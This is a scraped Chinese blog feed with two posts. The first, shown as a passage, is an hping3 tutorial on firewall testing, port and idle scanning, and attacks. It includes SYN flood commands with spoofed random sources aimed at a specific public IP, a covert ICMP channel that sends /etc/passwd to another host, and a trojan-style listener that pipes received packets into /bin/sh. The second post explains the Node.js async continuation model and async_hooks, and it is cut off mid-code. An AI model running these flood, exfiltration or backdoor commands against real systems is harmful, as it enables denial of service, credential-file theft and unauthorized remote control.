href="#4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist" class="headerlink" title="4.Can’t install the man page: /usr/local/confd/man/man8 does not exist"></a>4.Can’t install the man page: /usr/local/confd/man/man8 does not exist</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">有可能环境没有<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an8目录，我们可以手动创建此目录，或者自己修改脚本实现(我们需要把INSTALL_MANPATH改为<span class="regexp">/usr/</span>local<span class="regexp">/confd/m</span>an）</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="1-防火墙测试"><a href="#1-防火墙测试" class="headerlink" title="1.防火墙测试"></a>1.防火墙测试</h4><p>测试防火墙对ICMP包的反应、是否支持<a href="http://man.linuxde.net/traceroute">traceroute</a>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -S  -c <span class="number">1000000</span> -a <span class="number">10.10.10.10</span> -p <span class="number">21</span> <span class="number">10.10.10.10</span></span><br></pre></td></tr></table></figure><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hping3 -<span class="selector-tag">I</span> eth0  -S <span class="number">192.168</span>.<span class="number">10.1</span> -<span class="selector-tag">p</span> <span class="number">80</span></span><br><span class="line">//其中-<span class="selector-tag">I</span> eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-<span class="selector-tag">p</span> <span class="number">80</span>指定探测的目的端口。</span><br></pre></td></tr></table></figure><h4 id="3-Idle扫描"><a href="#3-Idle扫描" class="headerlink" title="3.Idle扫描"></a>3.Idle扫描</h4><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h4 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h4><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hping3</span> -I eth0 -a 你的ip -S <span class="number">8.134.53.173</span> -p <span class="number">443</span> -i u1000</span><br><span class="line"><span class="attribute">hping3</span> -c <span class="number">10000</span> -d <span class="number">1200000000</span> -S -w <span class="number">644</span> -p <span class="number">1688</span> --flood --rand-source <span class="number">8.134.53.173</span></span><br></pre></td></tr></table></figure><h4 id="5-文件传输"><a href="#5-文件传输" class="headerlink" title="5.文件传输"></a>5.文件传输</h4><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">hping3 192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">159</span><span class="literal">--</span><span class="comment">listen signature</span> <span class="literal">--</span><span class="comment">safe</span>  <span class="literal">--</span><span class="comment">icmp</span></span><br></pre></td></tr></table></figure><p>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.1.108<span class="params">--icmp</span> ?d 100 <span class="params">--sign</span> signature <span class="params">--file</span> <span class="string">/etc/passwd</span></span><br></pre></td></tr></table></figure><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h4 id="6-木马功能"><a href="#6-木马功能" class="headerlink" title="6.木马功能"></a>6.木马功能</h4><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<a href="http://man.linuxde.net/nc_netcat">netcat</a>的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p>在木马启动端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hping3 192.168.10.66<span class="params">--listen</span> signature <span class="params">--safe</span> <span class="params">--udp</span> -p 53 | <span class="string">/bin/sh</span></span><br></pre></td></tr></table></figure><p>在远程控制端：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">ls</span> &gt;test.cmd</span><br><span class="line">hping3 192.168.10.44 -p53 -d 100 <span class="params">--udp</span> <span class="params">--sign</span> siganature <span class="params">--file</span> <span class="string">./test.cmd</span></span><br></pre></td></tr></table></figure><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p><h3 id="hping3选项"><a href="#hping3选项" class="headerlink" title="hping3选项"></a>hping3选项</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">-H <span class="attr">--help</span> 显示帮助。</span><br><span class="line">-v -VERSION 版本信息。</span><br><span class="line">-c <span class="attr">--count</span> count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。</span><br><span class="line">-<span class="selector-tag">i</span> <span class="attr">--interval</span> 包发送间隔时间（单位是毫秒）缺省时间是<span class="number">1</span>秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发<span class="number">10</span>个数据包。</span><br><span class="line">-n -nmeric 数字输出，象征性输出主机地址。</span><br><span class="line">-<span class="selector-tag">q</span> -quiet 退出。</span><br><span class="line">-I <span class="attr">--interface</span> interface name 无非就是eth0之类的参数。</span><br><span class="line">-v <span class="attr">--verbose</span> 显示很多信息，TCP回应一般如：len=<span class="number">46</span> ip=<span class="number">192.168</span>.<span class="number">1.1</span> flags=RADF seq=<span class="number">0</span> ttl=<span class="number">255</span> id=<span class="number">0</span> win=<span class="number">0</span> rtt=<span class="number">0.4ms</span> tos=<span class="number">0</span> iplen=<span class="number">40</span> seq=<span class="number">0</span> ack=<span class="number">1380893504</span> sum=<span class="number">2010</span> urp=<span class="number">0</span></span><br><span class="line">-D <span class="attr">--debug</span> 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）</span><br><span class="line">-z <span class="attr">--bind</span> 快捷键的使用。</span><br><span class="line">-Z <span class="attr">--unbind</span> 消除快捷键。</span><br><span class="line">-O <span class="attr">--rawip</span> RAWIP模式，在此模式下HPING会发送带数据的IP头。</span><br><span class="line">-<span class="number">1</span> <span class="attr">--icmp</span> ICMP模式，此模式下HPING会发送IGMP应答报，你可以用<span class="attr">--ICMPTYPE</span> <span class="attr">--ICMPCODE</span>选项发送其他类型/模式的ICMP报文。</span><br><span class="line">-<span class="number">2</span> <span class="attr">--udp</span> UDP 模式，缺省下，HPING会发送UDP报文到主机的<span class="number">0</span>端口，你可以用<span class="attr">--baseport</span> <span class="attr">--destport</span> <span class="attr">--keep</span>选项指定其模式。</span><br><span class="line">-<span class="number">9</span> <span class="attr">--listen</span> signatuer hping的listen模式，用此模式，HPING会接收指定的数据。</span><br><span class="line">-<span class="selector-tag">a</span> <span class="attr">--spoof</span> hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span><br><span class="line">-t <span class="attr">--ttl</span> <span class="selector-tag">time</span> to live 可以指定发出包的TTL值。</span><br><span class="line">-H <span class="attr">--ipproto</span> 在RAW IP模式里选择IP协议。</span><br><span class="line">-w <span class="attr">--WINID</span> UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span><br><span class="line">-r <span class="attr">--rel</span> 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span><br><span class="line">-F <span class="attr">--FRAG</span> 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是<span class="number">16</span>字节。</span><br><span class="line">-x <span class="attr">--morefrag</span> 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span><br><span class="line">-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span><br><span class="line">-G <span class="attr">--fragoff</span> fragment offset value set the fragment offset</span><br><span class="line">-m <span class="attr">--mtu</span> mtu value 用此项后ID数值变得很大，<span class="number">50000</span>没指定此项时<span class="number">3000</span>-<span class="number">20000</span>左右。</span><br><span class="line">-G <span class="attr">--rroute</span> 记录路由，可以看到详悉的数据等等，最多可以经过<span class="number">9</span>个路由，即使主机屏蔽了ICMP报文。</span><br><span class="line">-C <span class="attr">--ICMPTYPE</span> type 指定ICMP类型，缺省是ICMP echo REQUEST。</span><br><span class="line">-K <span class="attr">--ICMPCODE</span> CODE 指定ICMP代号，缺省<span class="number">0</span>。</span><br><span class="line"><span class="attr">--icmp-ipver</span> 把IP版本也插入IP头。</span><br><span class="line"><span class="attr">--icmp-iphlen</span> 设置IP头的长度，缺省为<span class="number">5</span>（<span class="number">32</span>字节）。</span><br><span class="line"><span class="attr">--icmp-iplen</span> 设置IP包长度。</span><br><span class="line"><span class="attr">--icmp-ipid</span> 设置ICMP报文IP头的ID，缺省是RANDOM。</span><br><span class="line"><span class="attr">--icmp-ipproto</span> 设置协议的，缺省是TCP。</span><br><span class="line">-icmp-cksum 设置校验和。</span><br><span class="line">-icmp-ts alias <span class="keyword">for</span> <span class="attr">--icmptype</span> <span class="number">13</span> (to send ICMP timestamp requests)</span><br><span class="line"><span class="attr">--icmp-addr</span> Alias <span class="keyword">for</span> <span class="attr">--icmptype</span> <span class="number">17</span> (to send ICMP <span class="selector-tag">address</span> <span class="attribute">mask</span> requests)</span><br><span class="line">-s <span class="attr">--baseport</span> source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加<span class="number">1</span>，这规则你可以自己定义。</span><br><span class="line">-<span class="selector-tag">p</span> <span class="attr">--deskport</span> <span class="selector-attr">[+]</span><span class="selector-attr">[+]</span>desk port 设置目标端口，缺省为<span class="number">0</span>，一个加号设置为:每发送一个请求包到达后，端口加<span class="number">1</span>，两个加号为：每发一个包，端口数加<span class="number">1</span>。</span><br><span class="line"><span class="attr">--keep</span> 上面说过了。</span><br><span class="line">-w <span class="attr">--win</span> 发的大小和windows一样大，<span class="number">64</span>BYTE。</span><br><span class="line">-O <span class="attr">--tcpoff</span> Set fake tcp data offset. Normal data offset is tcphdrlen / <span class="number">4</span>.</span><br><span class="line">-m <span class="attr">--tcpseq</span> 设置TCP序列数。</span><br><span class="line">-l <span class="attr">--tcpck</span> 设置TCP ack。</span><br><span class="line">-Q <span class="attr">--seqnum</span> 搜集序列号的，这对于你分析TCP序列号有很大作用。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs异步延续模型</title>
      <link href="/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm"/>
      <url>/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Node-js异步延续模型"><a href="#Node-js异步延续模型" class="headerlink" title="Node.js异步延续模型"></a>Node.js异步延续模型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="attr">node</span>:<span class="number">12345</span>] <span class="title class_">Uncaught</span> <span class="title class_">Exception</span>: <span class="title class_">Error</span>: read <span class="variable constant_">ECONNRESET</span></span><br><span class="line">   at <span class="title class_">TLSWrap</span>.<span class="property">onStreamRead</span> (internal/stream_base_commons.<span class="property">js</span>:<span class="number">111</span>:<span class="number">27</span>)</span><br><span class="line">   <span class="comment">// 真的没了</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/641.png" alt="641"></p><h2 id="异步延续模型"><a href="#异步延续模型" class="headerlink" title="异步延续模型"></a>异步延续模型</h2><p>Node.js 使用的 JavaScript 单线程执行模型简化了非常多的问题。而为了防止 IO 阻塞 JavaScript 执行线程，IO 操作在关联了 JavaScript 回调函数后就被放入了后台处理。当 IO 操作完成后，与其关联的 JavaScript 回调会被放入事件队列等待在 JavaScript 线程调用，可以在这里[链接1]了解更多 Node.js 事件循环的详情。</p><p>这个模型有很多好处，但是也有一个关键的挑战：异步资源与操作的上下文管理。什么是异步操作上下文？异步操作的上下文就是给定一个异步操作，我们能够通过异步上下文知道这个异步操作是因为什么触发执行的，接下来可以触发其他什么异步操作。Semantics of Asynchronous JavaScript [链接2] 通过非常精确的描述方法描述了异步资源的“上下文”，但是我们只想回答一个问题，在程序的任意一个执行时间点，“我们是通过什么样的异步函数执行路径执行到现在这个代码位置的”？</p><p>为了回答这个问题，我们先明确几个关键点：</p><ul><li>执行桢 (Execution Frame) - 执行桢是程序中后继函数的一次执行过程。可以把执行桢当作从一个特定的函数执行桢被推入执行栈开始，直到这个执行桢执行结束被弹出调用栈，这样一段时间片段。不是所有的函数都是后继函数 (Continuation)，一个特定的后继函数可以被调用多次，每一次执行都对应一个独立的执行桢。</li><li>后继函数 (Continuation) - 后继函数是在执行桢中创建的 JavaScript 函数，并且会在后续被作为异步回调执行。当被调用时，后继函数会创建一个独立的执行桢。比如当我们调用 <code>setTimeout(function c() &#123;&#125;, 1000)</code>，<code>setTimeout</code> 是在一个执行桢里被调用的，并且以一个后继函数 <code>c</code> 作为参数。当 <code>c</code> 在计时到时后被执行时，会创建一个新的执行桢；当 <code>c</code> 执行结束时，即意味着这个新创建的执行桢执行结束。</li><li>后继点 (Continuration Point) - 后继点是接受一个后继函数作为参数的函数。通常在 JavaScript 中后继点都是宿主环境定义的（ECMAScript 规范中中不存在与 IO 相关的操作的定义）。比如 <code>setTimeout</code>，也包括 <code>Promise.then</code>。值得注意的是，不是所有接收函数作为参数的函数都是后继点，作为后继点，这些函数参数需要被异步调用，即不在当前执行桢被调用执行。比如 <code>Array.prototype.forEach</code> 就不算后继点。</li><li>链接点 (Link Point) - 程序运行中，当一个后继点被调用时，我们称为链接点。这个时候需要在当前执行桢与被作为参数传入的后继函数之间创建一个逻辑连接，作为上下文绑定。</li><li>就绪点 (Ready Point) - 就绪点是程序运行中之前链接过的后继函数被标记为“准备就绪”，准备被执行。这个过程会在后继函数与当前执行桢之间建立逻辑连接，这个逻辑连接可以称为因果关系。通常就绪点都需要在链接点后才能产生，但是 Promise 在这里的处理不太一样，promise 可以在他的 Promise 链中的前置的 promise 被 resolve 时产生一个就绪点，而此时不一定需要已经生成链接点（绑定回调函数），如 <code>new Promise(res =&gt; res())</code> 立刻创建了一个已经 resolve 的 Promise，此时已经触发了就绪点，但是我们还未通过 <code>.then</code> 链接上下一个 Promise。</li></ul><p>而上述几个关键点可以总结为以下几个事件：</p><ul><li>执行开始 (<code>executionBegin</code>): 表示一个执行桢开始执行；</li><li>链接 (<code>link</code>): 表示一个后继点被调用，一个后继函数被放入等待队列等待就绪；</li><li>就绪 (<code>ready</code>): 表示一个就绪点被触发；</li><li>执行结束 (<code>executionEnd</code>): 表示一个执行桢执行完毕。</li></ul><p>这里我们以下面这段代码举个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;starting&#x27;</span>);</span><br><span class="line"><span class="title class_">Promise</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">reject, resolve</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;resolving promise&#x27;</span>);</span><br><span class="line">   <span class="title function_">resolve</span>();</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in then&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码可以通过以下的事件流描述整个异步执行过程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序开始执行</span></span><br><span class="line"><span class="comment">// starting</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>&#125; <span class="comment">// `f1()` 已经被链接到了 &quot;setTimeout()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>&#125; <span class="comment">// `f2()` 已经被链接到了 &quot;p.then()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序外层代码执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// 100ms 计时到时，执行就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// f1() 回调开始执行</span></span><br><span class="line"><span class="comment">// resolving promise</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// promise p 被 resolve，标记了 &quot;then(function f2()...&quot; 就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span> &#125; <span class="comment">// f1() 回调执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// f2() 回调开始执行</span></span><br><span class="line"><span class="comment">// in then</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span> &#125; <span class="comment">// f2() 回调执行完毕</span></span><br></pre></td></tr></table></figure><p>现有技术</p><h3 id="async-hooks"><a href="#async-hooks" class="headerlink" title="async_hooks"></a><code>async_hooks</code></h3><p><code>async_hooks</code> 即是 Node.js 对上述模型的实现。其中 <code>async_hooks</code> API 提供了几个异步阶段的钩子回调可以注册：</p><ul><li><code>[init(asyncId, type, triggerAsyncId, resource): void](https://nodejs.org/api/async_hooks.html#async_hooks_init_asyncid_type_triggerasyncid_resource)</code> - 表示 asyncId 对应的异步资源（可以理解为上文中的异步上下文）初始化完成，后续这个资源可以触发异步回调（不绝对会触发，比如一个 HTTP Server 启动后没人来请求）；</li><li><code>[before(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_before_asyncid)</code> - 表示准备开始执行异步回调函数，而在这个异步回调函数的执行桢中，生成的任意异步资源（相当于上文中的后继函数）都会与 asyncId 参数对应的异步资源链接，作为触发原因；</li><li><code>[after(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_after_asyncid)</code> - 表示异步回调函数执行完毕，停止将asyncId 参数关联的异步资源与当前执行桢新创建的异步资源链接；</li><li><code>[destroy(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_destroy_asyncid)</code> - 表示 asyncId 参数对应的 异步资源被回收，后续不可能再通过这个异步资源触发回调。</li></ul><h3 id="与-domain-的区别"><a href="#与-domain-的区别" class="headerlink" title="与 domain 的区别"></a>与 <code>domain</code> 的区别</h3><p>部分了解、使用过 <code>domain</code> 模块的同学可能会有一个疑问，<code>async_hooks</code> API 与被废弃的 <code>domain</code> 有什么区别？</p><p><code>async_hooks</code> 作为上述异步模型中将各个异步资源链接起来的黏合剂，其本身并不提供任何错误处理相关的 API，他的 API 语义也非常清晰，只是对于异步资源的执行事件的描述。而 <code>domain</code> 的主要用途是异步错误的处理，但是因为在 <code>domain</code> 提出的时候还不存在 <code>async_hooks</code>，并且对于异步资源、异步执行的语义定义并不清晰，从而导致实际生产中 <code>domain</code> 的使用非常容易导致错误并且难以排查（多个 <code>domain</code> 的使用方其中如果使用了不是那么正确的方法，会将 <code>domain</code> 的状态搅得一团糟）。</p><p>而在 <code>async_hooks</code> 实现了明确的异步资源与执行的语义后，<code>domain</code> 的实现也进行了迁移、使用 <code>async_hooks</code> 来实现对于异步资源回调的追踪（实现详情可以了解 PR[链接3]）。</p><h3 id="Node-js-Add-on-的兼容性"><a href="#Node-js-Add-on-的兼容性" class="headerlink" title="Node.js Add-on 的兼容性"></a>Node.js Add-on 的兼容性</h3><p>虽然 Node.js 提供的 IO 操作的异步回调都已经被妥善地封装了异步调用的上下文切换，但是 Node.js 还提供了 C/C++ Add-on 的 API，这些 Add-on 普通的 <code>napi_call_function</code> 调用并不会被当成是一个新的执行桢，就如同一个 JavaScript 函数中调用另一个 JavaScript 函数。但是如果 Add-on 在异步回调中也简单地使用 <code>napi_call_function</code> 就有可能导致 async_hooks 所提供的异步资源 API 出现漏洞。所以 Add-on 需要按照 async_hooks 提供的钩子的语义，在各个关键时间点通过异步资源 API 注册上，即可完善整个异步调用链路。但是这样会给 Add-on 开发过程造成了一定的负担，而为了降低 Add-on 开发过程出现纰漏的可能。N-API 提供了线程安全的回调 JavaScript 线程的 <code>napi_threadsafe_function</code> 机制，并且已经与异步资源绑定，不需要我们再关心异步资源的事件管理。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#include &lt;assert.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;node_api.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">async_call_js</span>(<span class="params">napi_env env,</span></span><br><span class="line"><span class="params">                  napi_value js_callback,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* context,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* data</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 将 data 转换成 JavaScript 值</span></span><br><span class="line"> napi_value value = <span class="title function_">transform</span>(env, data);</span><br><span class="line"> napi_value recv;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;recv);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="comment">// N-API 已经为我们绑定了异步资源，这里可以安全地使用 `napi_call_function`</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_call_function</span>(env, recv, js_callback, <span class="number">1</span>, &amp;value, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会在工作线程被调用的工作函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">do_work</span>(<span class="params">napi_threadsafe_function tsfn</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/** work, work. */</span></span><br><span class="line"> napi_status status = <span class="title function_">napi_call_threadsafe_function</span>(tsfn, data, napi_tsfn_nonblocking);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">napi_value <span class="title function_">some_module_method</span>(<span class="params">napi_env env, napi_callback_info info</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 创建与 AsyncResource 绑定的 ThreadSafe Function</span></span><br><span class="line"> napi_threadsafe_function tsfn;</span><br><span class="line"> status = <span class="title function_">napi_create_threadsafe_function</span>(env,</span><br><span class="line">                                          func,</span><br><span class="line">                                          async_resource,</span><br><span class="line">                                          async_resource_name,</span><br><span class="line">                                          max_queue_size,</span><br><span class="line">                                          initial_thread_count,</span><br><span class="line">                                          finalize_data,</span><br><span class="line">                                          finalize_cb,</span><br><span class="line">                                          context,</span><br><span class="line">                                          call_js_cb,</span><br><span class="line">                                          &amp;tsfn);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 创建工作线程</span></span><br><span class="line"> <span class="title function_">create_worker</span>(tsfn, <span class="comment">/** 其他参数 */</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回 JavaScript 值..</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="异步任务调度"><a href="#异步任务调度" class="headerlink" title="异步任务调度"></a>异步任务调度</h3><p>在单元测试中，如果我们使用了异步任务，一个可能比较常见的场景就是这个异步任务可能会泄漏出我们的测试函数执行桢导致我们后续无法追踪、或者影响了后续的测试结果。</p><p>我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;should wait for async test&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">0</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">// only after this code executes will the test complete.</span></span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;wait for me&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们可以看到其中 setTimeout 逃逸出了测试执行桢，从而导致测试提早结束，并且可能影响后续测试任务的运行（比如在 setTimeout 中抛出了异常）。现在我们可以通过将全部的方法都使用 callback、promise 给串起来，但是这毕竟需要开发者自行去完成，并且可能出现疏漏，还是会出现例子中的情况。那么我们有没有可能从语言运行时层面提供一个“完美”的方案来跟踪所有的异步任务呢？通过 <code>async_hooks</code> 的异步资源追踪能力，我们就可以标记所有在测试执行过程中创建的异步资源，如果在测试执行结束后，还存在未销毁的异步资源，就可以更早地将问题暴露。</p><p>如我们有下面这个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;createHook, <span class="title class_">AsyncLocalStorage</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;async_hooks&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> als = <span class="keyword">new</span> <span class="title class_">AsyncLocalStorage</span>();</span><br><span class="line"><span class="keyword">const</span> backlog = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="title function_">createHook</span>(&#123;</span><br><span class="line"> init (asyncId, type, triggerAsyncId, resource) &#123;</span><br><span class="line">   <span 